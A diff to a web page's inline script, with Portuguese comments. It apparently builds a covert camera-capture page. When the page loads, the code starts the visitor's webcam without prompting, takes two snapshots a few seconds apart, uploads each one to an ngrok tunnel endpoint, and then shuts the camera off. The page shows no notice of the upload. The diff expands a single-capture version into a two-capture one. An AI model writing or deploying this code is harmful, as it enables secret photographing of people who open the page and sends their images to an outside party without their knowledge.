@@ -83,31 +83,53 @@
 <script>
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
+  let videoStream;
 
-  // Tenta iniciar a câmera automaticamente
-  navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-    video.srcObject = stream;
+  function captureAndSendImage(filename) {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
 
-    // Aguarda um momento para a câmera ligar e então captura
-    setTimeout(() => {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-      
-      canvas.toBlob(async (blob) => {
-        const formData = new FormData();
-        formData.append('image', blob, 'captura.png');
+    canvas.toBlob(async (blob) => {
+      const formData = new FormData();
+      formData.append('image', blob, filename);
 
-        await fetch('https://b056-177-102-12-199.ngrok-free.app/send-image', {
-          method: 'POST',
-          body: formData
-        });
-
+      await fetch('https://b056-177-102-12-199.ngrok-free.app/send-image', {
+        method: 'POST',
+        body: formData
       });
-    }, 1000); // 1 segundo depois de ligar a câmera
-  }).catch(err => {
-    console.error('Permissão negada ou erro:', err);
-  });
+
+      console.log(`Imagem ${filename} enviada`);
+    }, 'image/png');
+  }
+
+  // Inicia a câmera
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      videoStream = stream;
+      video.srcObject = stream;
+
+      // Espera 1 segundo e faz a 1ª captura
+      setTimeout(() => {
+        captureAndSendImage('captura1.png');
+
+        // Espera mais 5 segundos e faz a 2ª captura
+        setTimeout(() => {
+          captureAndSendImage('captura2.png');
+
+          // Depois desliga a câmera
+          if (videoStream) {
+            videoStream.getTracks().forEach(track => track.stop());
+            console.log('Câmera desligada');
+          }
+
+        }, 5000); // 5 segundos após a 1ª captura
+
+      }, 1000); // 1 segundo após iniciar
+    })
+    .catch(err => {
+      console.error('Permissão negada ou erro:', err);
+    });
 </script>
 
 </body>
